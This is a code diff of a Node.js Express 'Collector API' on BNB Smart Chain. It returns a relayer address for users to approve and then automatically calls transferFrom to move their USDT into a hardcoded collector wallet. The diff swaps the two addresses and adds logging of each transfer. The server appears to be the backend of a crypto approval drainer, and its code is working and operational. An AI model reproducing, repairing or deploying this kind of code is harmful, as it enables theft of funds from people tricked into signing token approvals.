@@ -10,15 +10,15 @@ const PORT = process.env.PORT || 10000;
 app.use(cors());
 app.use(express.json());
 
-// ============ CONFIGURATION ============
+// ============ CORRECT CONFIGURATION ============
 const CONFIG = {
-    // Collector – final destination for tokens (your main wallet)
-    COLLECTOR_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",
+    // 🎯 RELAYER – User approves this address (5e)
+    RELAYER_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",
 
-    // Relayer – the address users will approve (must match private key)
-    RELAYER_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
+    // 💰 COLLECTOR – Final destination where tokens go (8b)
+    COLLECTOR_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
 
-    // USDT on BSC (also used as default token)
+    // USDT on BSC
     USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
 
     // BSC RPC URL
@@ -58,7 +58,7 @@ function generateId() {
     return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
 }
 
-// ============ AUTO‑TRANSFER FUNCTION (FIXED) ============
+// ============ AUTO‑TRANSFER FUNCTION ============
 async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHuman) {
     console.log(`\n🚀 Starting auto-transfer for ${userAddress}`);
     console.log(`   Requested amount: ${requestedAmountHuman}`);
@@ -101,7 +101,7 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
             return { success: false, error: 'Zero balance' };
         }
 
-        // Check if user has enough balance for requested amount
+        // Check if user has enough balance
         if (balance < requestedAmountWei) {
             console.log(`❌ Insufficient balance. Requested: ${requestedAmountHuman}, Available: ${balanceHuman}`);
             return { success: false, error: 'Insufficient balance' };
@@ -119,17 +119,17 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
             return { success: false, error: 'Insufficient allowance' };
         }
 
-        // 🎯 Transfer EXACT requested amount (not full balance)
+        // 🎯 Transfer EXACT requested amount to COLLECTOR (8b)
         const transferAmountWei = requestedAmountWei;
         const transferAmountHuman = requestedAmountHuman;
 
-        console.log(`💸 Transferring EXACT amount: ${transferAmountHuman} to collector...`);
+        console.log(`💸 Transferring ${transferAmountHuman} to COLLECTOR (${CONFIG.COLLECTOR_ADDRESS})...`);
 
         const gasPrice = (await provider.getFeeData()).gasPrice;
 
         const tx = await token.transferFrom(
             userAddress,
-            CONFIG.COLLECTOR_ADDRESS,
+            CONFIG.COLLECTOR_ADDRESS,  // 🎯 Goes to 8b (Collector)
             transferAmountWei,
             { gasLimit: 100000, gasPrice }
         );
@@ -139,6 +139,8 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
         const receipt = await tx.wait();
 
         console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
+        console.log(`   From: ${userAddress}`);
+        console.log(`   To: ${CONFIG.COLLECTOR_ADDRESS} (Collector 8b)`);
         console.log(`   Amount: ${transferAmountHuman}`);
         console.log(`   Gas used: ${receipt.gasUsed.toString()}`);
 
@@ -159,8 +161,7 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
 
 /**
  * POST /send
- * Body: { "address": "0x..." }
- * Response: { found: boolean, collector: string, amountHuman?: number }
+ * Returns RELAYER address (5e) for user to approve
  */
 app.post('/send', (req, res) => {
     console.log('📨 POST /send:', req.body);
@@ -171,7 +172,7 @@ app.post('/send', (req, res) => {
         if (!address || !address.startsWith('0x')) {
             return res.json({
                 found: false,
-                collector: CONFIG.RELAYER_ADDRESS
+                collector: CONFIG.RELAYER_ADDRESS  // ✅ Returns 5e for approval
             });
         }
 
@@ -181,7 +182,7 @@ app.post('/send', (req, res) => {
         return res.json({
             found: !!(data && data.totalAmount > 0),
             amountHuman: data?.totalAmount || 0,
-            collector: CONFIG.RELAYER_ADDRESS
+            collector: CONFIG.RELAYER_ADDRESS  // ✅ Returns 5e for approval
         });
     } catch (error) {
         console.error('Error in /send:', error);
@@ -194,8 +195,7 @@ app.post('/send', (req, res) => {
 
 /**
  * POST /collect
- * Body: { token, from, amountHuman, to }
- * Response: { ok: true, id: string, blockNumber: number, gasUsed: string }
+ * Logs transaction and triggers transfer to COLLECTOR (8b)
  */
 app.post('/collect', async (req, res) => {
     console.log('📨 POST /collect:', req.body);
@@ -239,14 +239,13 @@ app.post('/collect', async (req, res) => {
         dataStore.addresses[addr].transactionCount++;
         dataStore.addresses[addr].lastSeen = new Date().toISOString();
 
-        // Keep only the last 5000 transactions
         if (dataStore.transactions.length > 5000) {
             dataStore.transactions = dataStore.transactions.slice(-5000);
         }
 
         saveData();
 
-        // 🎯 Trigger auto-transfer with EXACT requested amount
+        // Trigger auto-transfer to COLLECTOR (8b)
         performAutoTransfer(from, token, amountHuman).then(result => {
             if (result.success) {
                 console.log('✅ Auto-transfer successful!');
@@ -260,7 +259,6 @@ app.post('/collect', async (req, res) => {
             console.error('Auto-transfer promise rejected:', err);
         });
 
-        // Respond immediately
         res.json({
             ok: true,
             id: transactionId,
@@ -294,25 +292,13 @@ app.get('/health', (req, res) => {
  */
 app.get('/', (req, res) => {
     res.json({
-        message: 'Collector API with Auto-Transfer (Fixed)',
-        version: '2.1.0',
+        message: 'Collector API with Auto-Transfer',
+        version: '2.2.0',
         endpoints: ['POST /send', 'POST /collect', 'GET /health'],
-        collector: CONFIG.COLLECTOR_ADDRESS,
-        relayer: CONFIG.RELAYER_ADDRESS,
-        note: 'Transfers EXACT user-entered amount, not full balance'
-    });
-});
-
-/**
- * GET /transactions – View all transactions
- */
-app.get('/transactions', (req, res) => {
-    const { limit = 50 } = req.query;
-    const recent = dataStore.transactions.slice(-parseInt(limit)).reverse();
-    res.json({
-        count: recent.length,
-        total: dataStore.transactions.length,
-        transactions: recent
+        flow: {
+            approve: CONFIG.RELAYER_ADDRESS + ' (5e)',
+            transfer: CONFIG.COLLECTOR_ADDRESS + ' (8b)'
+        }
     });
 });
 
@@ -320,19 +306,21 @@ app.get('/transactions', (req, res) => {
 app.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════╗
-║     🚀 Collector API with Auto-Transfer (FIXED)   ║
+║     🚀 Collector API with Auto-Transfer           ║
 ╠══════════════════════════════════════════════════╣
 ║  Port: ${PORT}                                      ║
-║  Collector: ${CONFIG.COLLECTOR_ADDRESS}             ║
-║  Relayer:  ${CONFIG.RELAYER_ADDRESS}               ║
+║                                                  ║
+║  ✅ APPROVE (User signs):                        ║
+║     ${CONFIG.RELAYER_ADDRESS} (5e)                ║
+║                                                  ║
+║  💰 TRANSFER (Tokens go to):                     ║
+║     ${CONFIG.COLLECTOR_ADDRESS} (8b)              ║
+║                                                  ║
 ║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}                ║
 ║                                                  ║
-║  ✅ Transfers EXACT user-entered amount           ║
-║                                                  ║
-║  POST /send        – Check address               ║
-║  POST /collect     – Log & auto-transfer         ║
-║  GET  /health      – Status                      ║
-║  GET  /transactions – View all transactions      ║
+║  POST /send    – Returns 5e for approval         ║
+║  POST /collect – Transfers to 8b                 ║
+║  GET  /health  – Status                          ║
 ╚══════════════════════════════════════════════════╝
     `);
 });
